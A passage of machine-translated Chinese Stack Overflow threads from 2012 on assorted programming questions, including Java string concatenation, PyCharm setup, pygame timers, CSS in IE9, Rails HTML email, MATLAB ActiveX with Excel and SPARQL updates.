    .append(B_String.concat("CCCCCCCCCCC")).append(D_String
    .concat("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")
    .concat("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF")); 
```

处理这些情况的最佳实践和性能的一般规则是什么？我的假设是否正确`+`，它真的不应该被使用吗？

* * *

## 回答 #1

> 赞同：187
> 
> 时间：2012-04-09T20:00:29.110

# `+`操作员

```
String s = s1 + s2 
```

在幕后，这被翻译成：

```
String s = new StringBuilder(s1).append(s2).toString(); 
```

想象一下，如果你在这里有多少额外的工作`s1 + s2`：

```
stringBuilder.append(s1 + s2) 
```

代替：

```
stringBuilder.append(s1).append(s2) 
```

## 多个字符串`+`

值得注意的是：

```
String s = s1 + s2 + s3 + ... +sN 
```

被翻译成：

```
String s = new StringBuilder(s1).append(s2).append(s3)...apend(sN).toString(); 
```

# `concat()`

```
String s = s1.concat(s2); 
```

`String`创建`char[]`可以同时适合`s1`和的数组`s2`。复制`s1`和`s2`内容到这个新数组。实际上比`+`操作员需要更少的工作。

# `StringBuilder.append()`

`char[]`维护一个在需要时增长的内部数组。`char[]`如果内部足够大，则不会创建额外的。

```
stringBuilder.append(s1.concat(s2)) 
```

性能也很差，因为`s1.concat(s2)`创建了一个额外的`char[]`数组并复制`s1`到`s2`它只是为了将新数组内容复制到 internal `StringBuilder` `char[]`。

话虽如此，您应该`append()`一直使用并附加原始字符串（您的第一个代码片段是正确的）。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-04-09T19:57:50.713

编译器优化 + 连接。

所以

```
int a = 1;
String s = "Hello " + a; 
```

被转化为

`new StringBuilder().append("Hello ").append(1).toString();`

[这里](https://stackoverflow.com/questions/1532461/stringbuilder-vs-string-concatenation-in-tostring-in-java)有一个很好的主题，解释了为什么应该使用 + 运算符。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-05-12T19:41:16.390

优化由编译器自动完成。

Java2 编译器将自动转换以下内容：

```
String s = s1 + s2; 
```

到

```
String s = (new StringBuffer()).append(s1).append(s2).toString(); 
```

直接取自Oracles 网站上的[Java 最佳实践。](http://docs.oracle.com/cd/A97688_16/generic.903/bp/java.htm#1007796)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-09T19:58:25.850

您应该始终使用`append`.

`concat`创建一个新的字符串，所以它就像`+`我想的那样。

如果您`concat`或使用`+`2 final String JVM 可以进行优化，因此在这种情况下与进行追加相同。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-01-27T10:03:19.233

如果您恰好连接两个字符串，请使用 String.concat （通过创建一个适合两个字符串的新字符数组并将两个字符串的字符数组复制到其中来创建一个新字符串）。

如果在一行中连接多个（两个以上）字符串，请使用 + 或 StringBuilder.append，这无关紧要，因为编译器会将 + 转换为 StringBuilder.append。这对多个字符串很有用，因为它维护一个根据需要增长的 char 数组。

如果您在多行上连接多个字符串，请创建一个 StringBuilder 并使用附加方法。最后，当您完成将字符串附加到 StringBuilder 时，使用它的 .toString() 方法从中创建一个字符串。对于多行连接，这比第二种方法更快，因为第二种方法会在每一行上创建一个新的 StringBuilder，附加字符串，然后再转换回 String，而第三种方法只使用一个 StringBuilder 来完成整个事情。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-03-01T06:14:30.560

我个人更喜欢`Strings.format()`简单易读的单行[字符串格式化程序](https://docs.oracle.com/javase/8/docs/api/java/lang/String.html#format-java.util.Locale-java.lang.String-java.lang.Object...-)。

```
String b = "B value";
String d = "D value";
String fullString = String.format("A %s C %s E F", b, d);
// Output: A B value C D value E F 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-08-10T03:34:26.193

使用`+`运算符是最佳实践，它也简单易读。

> Java 语言为字符串连接运算符 ( + ) 以及将其他对象转换为字符串提供了特殊支持。字符串连接是通过 StringBuilder（或 StringBuffer）类及其 append 方法实现的。

官方文档：[https ://docs.oracle.com/javase/8/docs/api/java/lang/String.html](https://docs.oracle.com/javase/8/docs/api/java/lang/String.html)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-09-26T14:26:21.307

在字节码级别并没有什么不同，我们不会影响那里的效率。在执行字节码级别的情况下，必须通过调用append的方式对+进行非内联运算符重载方法。然后在汇编语言级别（Java是用C编写的，C产生类似于汇编的程序集，会有额外的寄存器调用来存储+堆栈中的方法调用，并且会有额外的push。（实际上，交叉编译器可能会优化+运算符打电话，在这种情况下，它与效率没有区别。）

有一种方法来提高可读性是一种很好的做法。:)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-08-02T11:45:33.683

所有的答案都很好而且解释性很强。但我觉得探索其他字符串连接技术也会有所帮助，比如 Guava Joiner、Streams、String.format 等。

有关每种连接技术性能的完整详细信息[java-string-concatenation-which-way-is-best](https://redfin.engineering/java-string-concatenation-which-way-is-best-8f590a7d22a8)。

简而言之，连接性能随 no 变化。要连接的字符串。例如 - 要连接 1-10 个字符串，这些技术效果最好 - StringBuilder、StringBuffer 和 Plus 运算符。并连接 100 个字符串 - Guava Joiner，apache 的 stringsUtils 库也很好用。

请浏览上述博客。它确实很好地解释了性能效率。

谢谢。

# python - Python3/MacOSX 集成到 pycharm

> ID：10078914
> 
> 赞同：3
> 
> 时间：2012-04-09T19:51:35.270
> 
> 标签：python, macos, python-3.x, pycharm

我在使用 python3 的 macosx10.7 上设置 pycharm ide 时遇到了麻烦。

我已经搜索了所有可用的资源并尝试了数百种方法，在这一点上我必须接受我的无能并通过这个渠道寻求帮助。

在我的研究中，我注意到缺乏关于 python 集成到 macosx 以及如何配置 pycharm 以导入模块、在编辑器中运行代码等的基本解释。如果我解决了这个问题，我将制作一个非常详细的教程。

我已经成功导入了python3，看起来它从`/sys/lib/frameworks`到`/usr/lib`...等`-- version`控制适当地链接工作得很好。

我认为我的问题要么在于设置环境变量（尝试了解决此问题的程序并尝试了 macports），要么在于需要执行的脚本。它会在整个过程中捕获错误，但最终产品不会在 python 中运行并返回打印输出：

```
/Library/Frameworks/Python.framework/Versions/3.2/bin/python3.2 /Users/anon/Desktop/pythonpractice/Py_Ex/classes.py

Process finished with exit code 0 
```

我真的需要为我的 python 编程课获得这个配置声音。请帮忙（我已经浏览了pycharm网站的每一行）..最好有办法通过终端映射它吗？感谢任何花时间阅读本文的人。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T13:35:28.827

上述讨论的总结：

*   Python 3.2.2 安装在这台 Mac 上被破坏，从头开始安装[ActiveState Python 3.2.2并在 PyCharm 中配置它已经解决了这个问题。](http://www.activestate.com/activepython/downloads)

*   要在 PyCharm 设置中使用的 Python 路径：`/Library/Frameworks/Python.framework/Versions/3.2/bin/python3`

*   不兼容的第三方插件可能会破坏 PyCharm，请在`Preferences`|中卸载/禁用它们 `Plugins`.

*   确保安装了[最新的 PyCharm 版本](http://www.jetbrains.com/pycharm/download/index.html)。

*   用户的代码取决于`graphics.py`不在项目中或不在`PYTHONPATH`. 把它放到项目中已经解决了这个问题。

*   很可能在 PyCharm 中使用了错误的运行/调试配置，运行或调试此类脚本的最简单方法是使用编辑器上下文菜单运行和调试操作。PyCharm 自动创建配置，调试工作正常，如屏幕截图所示：

![调试](../Images/7a9b764e37ce6c7e0b595bbf9d5eb3ce.png)

*   如果想对其进行配置和调试，可以使用[code.zip](http://mcsp.wartburg.edu/zelle/python/ppics2/index.html)文件开始。

很抱歉上面的评论乱七八糟，但由于用户只有 1 个声望点，因此无法将其移至聊天中，因此无法使用 StackOverflow 的聊天功能。

# python - 使用 Python 将 CSV 数据分组在一起

> ID：10078915
> 
> 赞同：1
> 
> 时间：2012-04-09T19:51:37.343
> 
> 标签：python, csv, grouping

我有一个关于如何使用 python 执行特定任务的问题。我觉得这应该很简单，但我是 python 新手，我似乎找不到专门解决我需要做的事情的帖子，即将 .csv 文件中的项目组合在一起。下面我将描述我正在使用的 csv 文件以及我希望使用 python 对表单中包含的数据执行的初始步骤。

.csv 文件

该文件是从我用来管理问卷的程序生成的。每个“列”都有一个标题；每个“行”包含一个参与者编号和他们对 100 个问题的回答：每个参与者的问题顺序相同。

步骤

如前所述，我需要处理的数据是 100 个问题的答案。我需要将问题分成 10 组，每组 10 个问题。我需要对十组中的五组进行一些简单的分析。分析完成后，我需要将分析的 5 个中的每组中的 1 个添加到未以任何方式操作的 5 个中的每组中的 1 个。

问题

我遇到的问题是我无法找到一种方法将 csv 文件中的数据（例如一行中的 10 个特定列）组合在一起以组成一个特定组。我已经在 csv.dictReader_Writer mod/class 上进行了一些阅读和搜索，但我还没有遇到如何做到这一点的示例。以前这里有没有人执行过这种类型的任务，如果有，有人会这样做吗？不幸的是，我还没有开始任何代码，因为这将是我首先需要做的事情之一，当然除了导入模块之外，为了以任何方式操作数据。

# c - 插入（不覆盖）到 C 中的文件

> ID：10078917
> 
> 赞同：1
> 
> 时间：2012-04-09T19:51:50.803
> 
> 标签：c, file

在 C 语言中，我`fseek`用来返回文件中的某个位置。然后当我用 写入文件时`fprintf`，它会覆盖该位置的字符。有没有办法让 fprintf/另一个函数插入，而不是覆盖？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T19:53:04.023

最简洁的答案是不”。如果需要插入，确实需要在插入后重写整个文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:54:12.133

No. C 没有“文件插入”的概念。您必须通过将插入点之后的所有数据复制到文件下方更远的位置来手动在文件中创建一个“间隙”。

# php - 验证文本区域

> ID：10078920
> 
> 赞同：0
> 
> 时间：2012-04-09T19:52:07.267
> 
> 标签：php, jquery, codeigniter

我所有的其他表单元素都验证了我的文本区域。思考一下为什么使用以下代码？

```
<?php $attributes = array('cols' => '30', 'rows' => '5', 'id' => 'article', 'class' => 'required') ?>
 <div>
     <?php echo form_textarea('article', '', $attributes); ?>  
 </div> 
```

编辑：我正在使用 jQuery 验证类。

```
<div class="section _100">
<label for="article">Article</label>   
    <div>
        <textarea name="article" cols="40" rows="10" Array></textarea>  
    </div>
</div> 
```

所以现在我想知道为什么当它应该完成放置类部分的属性时它会显示这样的数组。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T20:27:03.997

根据[Form_helper 文档](http://codeigniter.com/user_guide/helpers/form_helper.html)，您可以`textarea`通过将名称和属性值作为两个参数传递*或*将所有属性作为数组作为单个参数传递来生成 a。

请注意，在您的代码中，您有第三个参数。这是为附加数据保留的，例如 JavaScript。它只是作为字符串附加在`textarea`标签中 - 这就是您看到`Array`.

像这样创建你的，但在数组`textarea`中包含你的名字：`$attributes`

```
$attributes = array(
    'name' => 'article', 
    'cols' => '30',
    'rows' => '5', 
    'id' => 'article', 
    'class' => 'required'
);

echo form_textarea($attributes); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T20:26:40.610

当您传递属性数组时，它应该是唯一的`form_textarea`函数。尝试这个：

```
<?php $attributes = array('name' => 'article', 'cols' => '30', 'rows' => '5', 'id' => 'article', 'class' => 'required') ?>
<div>
    <?php echo form_textarea($attributes); ?>  
</div> 
```

# java - 在不知道矩阵的情况下筛选 XYZ 到 XY 的世界

> ID：10078923
> 
> 赞同：-1
> 
> 时间：2012-04-09T19:52:24.040
> 
> 标签：java, opengl, coordinates

在不知道渲染所涉及的所有矩阵的情况下，如何准确地实现要筛选的世界？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T00:08:58.197

`gluProject`只需将所有给定的转换应用于传递的点。如果你传递了错误的变换或错误的点，你会得到错误的结果。

例如，如果你想要一个物体中心的屏幕坐标，假设物体未变换的坐标以(0,0,0)为中心，你可以`gluProject`坐标为(0,0,0)，modelview变换生效绘制该对象时，通常用于投影和视口。

请使用标准常量！`2892`当有非常好的常量时，在你的代码中使用和类似的东西，比如`GL11.GL_MODELVIEW_MATRIX`让婴儿耶稣哭泣。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:23:54.103

您使用 gluproject 进行的转换使用以下系统：

```
y
|
|
+------x 
```

但是您的屏幕使用的是以下系统：

```
+-------x
|
|
|
y 
```

你所要做的就是：

```
yCoord = window_height - yCoord; 
```

# url - Play 中的 SEO 友好路由

> ID：10078940
> 
> 赞同：2
> 
> 时间：2012-04-09T19:53:43.033
> 
> 标签：url, seo, playframework, directory

简短版本：是否有一种有吸引力的简单方法来实现特定于语言的 url 结构，ala。玩 1.2.5 中的 host.com/en/ 或 host.com/pt/？

我正在寻找一种不需要更改所有控制器的解决方案，并且更改最好只针对路由文件，因为我不想要两组冗余视图 - 每种语言一个。

我已经有一个message.pt 和message.en，并且我有一种在两者之间切换的方法，但是在路由方面我是个新手。

我意识到路由文件可以包含如下路由：“/（en | pt）/”但我有点卡在这里。

如果问题有点含糊，我很抱歉。如果需要，我会很乐意澄清。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:19:54.327

我认为没有办法解决这个问题，你必须对你的控制器做点什么。

我没有对此进行测试，但这样的事情应该可以工作：

```
public static class LanguageParams extends Controller
{
    @Before
    static void addLanguageParam(String language)
    {
         renderArgs.put("lang", language);
    }
} 
```

您需要像这样将@With 添加到每个控制器：

```
@With(LanguageParams.class)
public class Foo extends Controller
{
....
} 
```

...在你的路线中，你会有这样的事情：

```
GET  foo/{<en|pt>language>}/whatever       Foo.index() 
```

在写这篇文章时，我想到你可以使用插件来做到这一点，请参阅：[http://www.playframework.org/documentation/api/1.2/play/PlayPlugin.html#beforeActionInvocation(java.lang.反射](http://www.playframework.org/documentation/api/1.2/play/PlayPlugin.html#beforeActionInvocation(java.lang.reflect.Method).方法)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T13:39:04.137

我在 Play 1.1 的一些旧更改说明中找到了解决方案： [http](http://www.playframework.org/documentation/1.2/releasenotes-1.1) ://www.playframework.org/documentation/1.2/releasenotes-1.1 （在“全局路由参数”下）。奇怪的是它在其他任何地方都没有提到。

[编辑以包括整个工作解决方案] [Edit2 - 修复了一个问题]

我的路线文件如下所示：

```
# Home page
GET     /{lang}/?                           Application.index
GET     /                                   Application.redirect
GET     /{lang}/woops/?                     Application.underConstruction 
```

语言控制器看起来像这样 atm：

```
public class Language extends Controller {

@Before
static void detectLangInURL() {
    String url = request.url;

    if (url.length() > 2 && isSupported(getFromUrl(url)))
    {
        String lang = getFromUrl(url);
        if (!Lang.get().equals(lang)) {
            Lang.change(lang);
            response.setCookie("lang", lang, "60d");
        }
        renderArgs.put("lang", Lang.get());
        routeArgs.put("lang", Lang.get());
    }
}

private static String getFromUrl(String url) {
    String[] s = url.split("[/]");
    if (s.length > 1)
        return s[1];
    else return "";
}

private static boolean isSupported(String lang) {
    if (lang.length() == 0)
        return false;

    String[] langList = Play.configuration.get("application.langs").toString().split(",");
    for (int i = 0; i < langList.length; i++) {
        if (langList[i].compareToIgnoreCase(lang) == 0)
            return true;
    }

    return false;
}
} 
```

重定向方法如下所示：

```
public static void redirect() {
    Cookie lang = request.current().cookies.get("lang");
    if (lang != null && !lang.value.isEmpty())
        Lang.change(lang.value);
    redirect(Lang.get() + "/");
} 
```

我必须在使用`@With(Language.class)`注释或更改 Controller 超类之间做出选择。我选择 @With 注释。

我很高兴，它最终变得非常简单。我希望有人可以从上述中受益。

# python - pygame相当于settimeout？（在 x 毫秒后调用函数？）

> ID：10078949
> 
> 赞同：1
> 
> 时间：2012-04-09T19:54:33.057
> 
> 标签：python, pygame

我将如何在设定的毫秒数后执行一些代码？

我只想执行一次。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T20:08:36.823

有一个函数，它每毫秒在事件队列上`pygame.time.set_timer(eventid, milliseconds)`生成一个带有 id的事件，然后你可以随意处理它。您可以通过调用来阻止事件再次生成。`eventid``milliseconds``pygame.time.set_timer(eventid, 0)`

SDL 有一个`SDL_AddTimer`完全符合您要求的函数——您将一个回调函数传递给它，以便在延迟后执行，但是从文档中我真的找不到`pygame`等效的。

对于 python 解决方案，您可以使用[`threading.Timer`](http://docs.python.org/library/threading.html#threading.Timer)该类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:57:50.750

看看模块[sched — 事件调度](http://docs.python.org/library/sched.html)器。链接中的示例非常简洁，可以帮助您入门

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T02:25:49.553

对于 python 解决方案 setTimeout 等效为：

```
 import threading

def set_timeout(func, sec):     
    t = None
    def func_wrapper():
        func()  
        t.cancel()
    t = threading.Timer(sec, func_wrapper)
    t.start()

    def hello():
       print "Hello, world!"

    set_timeout(hello, 0.1) # This is 0.1s = 100ms 
```

# css - CSS“无重复”在 IE 中不起作用

> ID：10078952
> 
> 赞同：1
> 
> 时间：2012-04-09T19:54:38.590
> 
> 标签：css, internet-explorer, content-management-system

在 CMS 中使用一些内联 CSS（有趣！）。这段代码在 Chrome 和 Firefox 中正常工作，背景图像只出现一次。但是当页面在 IE 9 中加载时，就好像 no-repeat 值被忽略并且背景图像在 div 的长度上重复。

```
<div style="width: 500px; margin-top: -10px; background-image: url(http://.../uploadedImages/horizontal-rule-top.gif); background-position: 50% 0%; background-repeat: no-repeat, no-repeat; "><p style="margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; color: rgb(228, 128, 28); padding-top: 30px; padding-bottom: 15px; font-size: 16px; ">
...</div> 
```

任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T19:57:09.040

我认为 IE 在存在 second 时遇到了麻烦`no-repeat`，并且根据规范，无视它不理解的规则。IE 理解的选项似乎是：

*   `repeat-x`,
*   `repeat-y`， 和
*   `no-repeat`.

如果您将 CSS 修改为上述之一，它应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:59:36.780

尝试`background-repeat: no-repeat;`不使用第二个值。我相信二值语法是[CSS3 工作草案](http://www.w3.org/TR/css3-background/#the-background-repeat)的一部分， IE9 可能无法实现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-16T10:19:46.943

试试你的背景 css “背景：url(http://.../uploadedImages/horizo​​ntal-rule-top.gif) no-repeat 50% 0%;”

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-04T14:21:45.500

证明：

背景-重复-x：不重复；背景重复：重复-y；

# html - Rails HTML 电子邮件显示 HTML 代码

> ID：10078959
> 
> 赞同：4
> 
> 时间：2012-04-09T19:55:09.063
> 
> 标签：html, ruby-on-rails-3, email, actionmailer

我正在为新用户编写 html 欢迎电子邮件，但它不起作用。当我发送它时，它会将 html 代码显示为文本，而不是呈现实际的 html。我从 Mailchimp 的模板开始制作模板的 html，所以我很惊讶它不起作用。此外，当我使用 Putsmail.com 和 emailonacid.com 发送电子邮件时，它看起来还不错。

但是，在生产中，电子邮件发送并且 html 在电子邮件中显示为文本，如下所示（来自registration_confirmation.html.erb）：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body leftmargin="0" marginwidth="0" topmargin="0" marginheight="0" offset="0" style="width: 100% !important; -webkit-text-size-adjust: none !important; background-color: #ffa500 !important; margin: 0; padding: 0;" bgcolor="#ffa500">
   <center>
     <table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" id="backgroundTable" style="height: 100% !important; width: 100% !important; margin: 0; padding: 0;">
       <tr>
         <td align="center" valign="top">
         <!-- // Begin Template Preheader \\ -->
           <table border="0" cellpadding="10" cellspacing="0" width="600" id="templatePreheader" style="background-color: #ffa500;" bgcolor="#ffa500">
             <tr>
               <td valign="top" class="preheaderContent">
                 <table border="0" cellpadding="10" cellspacing="0" width="100%">
                   <tr>
                     <td valign="top">
                       <div mc:edit="std_preheader_content" style="color: #505050; font-family: Arial; font-size: 10px; line-height: 100%; text-align: left;" align="left">
                       </div>
                     </td>
                     <td valign="top" width="180">
                       <div mc:edit="std_preheader_links" style="color: #505050; font-family: Arial; font-size: 10px; line-height: 100%; text-align: left;" align="left">
                       </div>
                     </td>
                   </tr>
                 </table>
               </td>
             </tr>
           </table>

           <table border="0" cellpadding="0" cellspacing="0" width="600" id="templateContainer" style="background-color: #ffffff; border: 1px solid #dddddd;" bgcolor="#ffffff">
             <tr>
               <td align="center" valign="top">
                 <table border="0" cellpadding="10" cellspacing="0" width="600" id="templateBody">
                   <tr>
                     <td valign="top" class="bodyContent" style="background-color: #ffffff;" bgcolor="#ffffff">
                       <table border="0" cellpadding="10" cellspacing="0" width="100%">
                         <tr>
                           <td>
                             <a href="http://foobar.com">                                                                                                                      
                               <img src="https://s3.amazonaws.com/images/email_logo.gif" style="float:right;" alt="logo" />
                             </a>
                           </td>
                         </tr>

                         <tr>
                           <td valign="top">
                             <div mc:edit="std_content00" style="color: #505050; font-family: Arial; font-size: 14px; line-height: 150%; text-align: left;" align="left">
                               <span class="h2" style="color: #202020; display: block; font-family: Arial; font-size: 22px; font-weight: bold; line-height: 100%; margin-bottom: 10px; text-align: left;">Welcome to <%= user.name %>!</span>
                               Thanks for registering!<br /><br />
                             </div>                                                                                                                
                           </td>
                         </tr>
                       </table>
                     </td>
                   </tr>
                 </table>
               </td>
             </tr>

             <tr>
               <td align="center" valign="top">     
                 <table border="0" cellpadding="10" cellspacing="0" width="600" id="templateFooter" style="background-color: #FDFDFD; border-top-width: 0;" bgcolor="#FDFDFD">
                 <tr>
                   <td valign="top" class="footerContent"></td>
                 </tr>
               </table>
             </td>
           </tr>
         </table>
         <br>
       </td>
     </tr>
   </table>
 </center>

 <style type="text/css">
   body { width: 100% !important; }
   body { -webkit-text-size-adjust: none !important; }
   body { margin: 0 !important; padding: 0 !important; }
   img { border: none !important; font-size: 14px !important; font-weight: bold                                    
   !important; height: auto !important; line-height: 100% !important; outline: none  
   !important; text-decoration: none !important; text-transform: capitalize !important; }
   #backgroundTable { height: 100% !important; margin: 0 !important; padding: 0
   !important; width: 100% !important; }
   body { background-color: #FAFAFA !important; }
   .preheaderContent div a:visited { color: #336699 !important; font-weight: normal
   !important; text-decoration: underline !important; }
   .headerContent a:visited { color: #336699 !important; font-weight: normal
   !important; text-decoration: underline !important; }
   .bodyContent div a:visited { color: #336699 !important; font-weight: normal
   !important; text-decoration: underline !important; }
   .footerContent div a:visited { color: #336699 !important; font-weight: normal
   !important; text-decoration: underline !important; }
   body { background-color: #ffa500 !important; }
 </style> 
```

我的邮件：

```
def registration_confirmation(user)
  @user = user
  subject     "Welcome #{@user.first_name}!"
  from        "info@foobar.com"
  recipients  @user.email
  sent_on     Time.now
end 
```

从用户注册模型调用：

```
Notifier.registration_confirmation(user).deliver 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:58:07.853

您似乎缺少内容类型：

```
def registration_confirmation(user)
  @user = user
  subject       "Welcome #{@user.first_name}!"
  from          "info@foobar.com"
  recipients    @user.email
  sent_on       Time.now

  # Set content-type header
  content_type "text/html"
end 
```

它默认为`text/plain`，因此您必须为 HTML 或多部分消息显式设置它。

# matlab - 使用 ActiveX 从 Matlab 打开现有工作簿

> ID：10078960
> 
> 赞同：2
> 
> 时间：2012-04-09T19:55:09.427
> 
> 标签：matlab, vba, excel, activex

我需要使用 ActiveX 从 Matlab 中打开现有的 excel 工作簿。xlsread 不可行，因为太慢了。从这个论坛获得帮助后（谢谢！）我知道要从 matlab 中创建一个新的 excel 工作簿并用输出填充它，你可以这样做：

```
 %# Create and NAME the output file name
    wbk=1;fName = fullfile(pwd, 'ALLSDtemp2');
    %# create Excel COM Server
    Excel = actxserver('Excel.Application');
    Excel.Visible = true;
    %# delete existing file
    if exist(fName, 'file'), delete(fName); end
    %# create new XLS file
    wb = Excel.Workbooks.Add();
    wsheet=1;

    (...calculations...)

    % Write output to excel file
    Mat=[calculation_output];
    % Select work book
    wb.Sheets.Item(wsheet).Activate();
    % Get Worksheets object
    ws = wb.Sheets;
    %# insert matrix in sheet
    Excel.Range(cellRange).Select();
    Excel.Selection.Value = num2cell(Mat); 
```

但我无法弄清楚如何使用已经存在的 excel 工作簿来做到这一点。前几天我的努力导致我的电脑出现“严重错误”。所以我真的可以使用一些指导。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:30:05.297

XLSREAD 实际上是通过 ActiveX 访问文件，与您想要的方式相同。我看不出有任何理由编写您自己的（并希望清除错误）程序。

如果 XLSREAD 太慢，可以使用[PROFILER](http://www.mathworks.com/help/techdoc/matlab_env/f9-17018.html)来查找函数中的性能瓶颈。

如果您键入 .，您实际上可以看到 XLSREAD 在做什么`edit xlsread`。带有函数的 m 文件将在 MATLAB 编辑器中打开。您可以学习代码并使用出色的 MATLAB 调试工具逐行实际运行它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T12:31:52.057

根据您的问题，我不确定您是希望修改现有的 Excel 文件，还是修改当前在 Excel 中打开的 Excel 文件。

如果是第一个，那么你可以这样打开它：

```
xl = actxserver('Excel.Application');
xl.Visible = true;
wb = xl.Workbooks.Open('path_to_my_excel_file'); 
```

然后继续进行您想要的任何修改，就像您已经在做的那样。

如果要访问当前在 Excel 中打开的 Excel 文件，请`actxGetRunningServer`使用`actxserver`. 您将连接到 Excel 的运行副本，并能够找到任何打开的工作簿。

顺便说一句，您无需选择范围即可更改其值。你可以只使用`ws.Range(cellRange).Value = myValue`. 可能会在这里和那里为您节省几行代码。

# jsp - 使用 JSP 或 Javascript 更改 URL

> ID：10078961
> 
> 赞同：0
> 
> 时间：2012-04-09T19:55:16.733
> 
> 标签：jsp, url-rewriting

我目前正在开发一个文档管理系统，该系统从数据库中获取 BLOB 并显示文档（通常是 pdf，但这不重要）。我的代码可以打开文档，但是在打开后保存文件时，它会保存为 URL.pdf。所以如果获取文件的页面的URL是：

```
get.jsp?doc=1 
```

然后从数据库中加载文档，显示给用户就好了。

但是，如果您尝试保存文件，默认名称将显示为

```
get.pdf 
```

我希望它是存储在数据库中的实际文档名称。我想我必须更改 URL 才能这样做，但我可以以不同的方式工作，只要文档可以保留用户可能不知道的名称。我正在使用 JSP。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:57:37.813

您可以使用响应对象在您的操作中执行此操作。只需将“NAME_THE_FILE_HERE”替换为您希望文件命名的任何内容。

```
 httpServletResponse.setContentType( "application/pdf" );
        httpServletResponse.setHeader( "Content-Disposition" , "attachment; filename=" + "NAME_THE_FILE_HERE"); 
```

# rdf - 单个请求中的多个 SPARQL“INSERT WHERE”查询

> ID：10078966
> 
> 赞同：8
> 
> 时间：2012-04-09T19:55:44.640
> 
> 标签：rdf, sparql

我的问题类似于在这个线程上提出的问题[是否可以将这 2 个 SPARQL INSERT 合并为一个？](https://stackoverflow.com/questions/8413901/is-it-possible-to-combine-those-2-sparql-insert-into-one)

我想在查询中有多个 INSERT WHERE 语句，但针对不同的主题。我想测试一个特定的值（“testValueN”），如果存在，我想为那个主题插入一个新的三元组。

一个例子是，

```
PREFIX Sensor: <http://example.com/Equipment.owl#> 
{
    INSERT { 
        ?subject1 Sensor:test2 'newValue1' . 
           }
    WHERE {
        ?subject1 Sensor:test1  'testValue1' . 
          }
};
{
    INSERT { 
        ?subject2 Sensor:test2 'newValue2' . 
           }
    WHERE {
        ?subject2 Sensor:test1  'testValue2' . 
          }
}; 
```

我知道上面的查询是错误的。我想知道在 SPARQL 中是否有类似的东西。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-10T07:29:56.003

是的，这是可能的。事实上，你的例子几乎完全没问题，只是把每个插入的括号都去掉了：

```
PREFIX Sensor: <http://example.com/Equipment.owl#> 
INSERT { 
    ?subject1 Sensor:test2 'newValue1' . 
}
WHERE {
    ?subject1 Sensor:test1  'testValue1' . 
};
INSERT { 
   ?subject2 Sensor:test2 'newValue2' . 
}
WHERE {
   ?subject2 Sensor:test1  'testValue2' . 
} 
```

是一个有效的 SPARQL 更新序列。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-05-24T15:27:15.883

> 我想在查询中有多个 INSERT WHERE 语句，但针对不同的主题。我想测试一个特定的值（“testValueN”），如果存在，我想为那个主题插入一个新的三元组。

您可以使用**值**来指定所需的 oldValue/newValue 对，并且只需要一个**insert**。它还可以更好地扩展到新的对，因为您只需在查询中添加一行。

```
PREFIX Sensor: <http://example.com/Equipment.owl#> 
INSERT { 
    ?subject Sensor:test2 ?newValue 
}
WHERE {
    values (?oldValue ?newValue) { 
        ('testValue1' 'newValue1')
        ('testValue2' 'newValue2')
    }
    ?subject Sensor:test1 ?oldValue
} 
```

# sql-server - 重复使用 SQL Server 产品密钥以在工作站上安装开发人员工具

> ID：10078970
> 
> 赞同：2
> 
> 时间：2012-04-09T19:56:04.713
> 
> 标签：sql-server, license-key

在我的工作场所，我们刚刚使用 MSDN 订阅的产品密钥在我们的开发服务器中升级到 SQL Server 2008 R2 Advanced，并且我们希望像 2005 版一样在多个工作站中安装完整的开发人员工具（Management Studio 和 Profiler） .

问题是 2008 版的设置在选择要安装的组件之前要求提供产品密钥，我们想知道是否允许使用与服务器相同的密钥来安装开发人员工具。

如果没有，有没有一种方法可以在多个工作站中安装（合法）SQL Server Profiler，而每个工作站都没有不同的密钥？（我们只有几个来自 MSDN 订阅的密钥）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T21:28:42.987

我不这么认为。我认为很明显，MSFT 希望每个开发人员都有自己的 MSDN 订阅：

